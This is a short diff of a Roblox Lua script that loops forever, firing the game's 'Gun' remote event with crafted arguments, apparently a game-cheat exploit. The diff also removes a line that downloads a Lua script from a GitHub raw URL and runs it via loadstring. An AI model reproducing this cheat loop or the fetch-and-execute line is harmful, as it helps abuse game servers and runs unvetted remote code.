@@ -1,5 +1,3 @@
-
-local function eksdee()
 while wait() do
 --Hitpart >
 local hitpart
@@ -28,6 +26,3 @@ local args = {
 game:GetService("ReplicatedStorage").Gun:FireServer(unpack(args))
 hitpart = ""
 end
-end
-eksdee()
-loadstring(game:HttpGet('https://raw.githubusercontent.com/AstraTehFloof/teyeye/main/teleport.lua',true))())
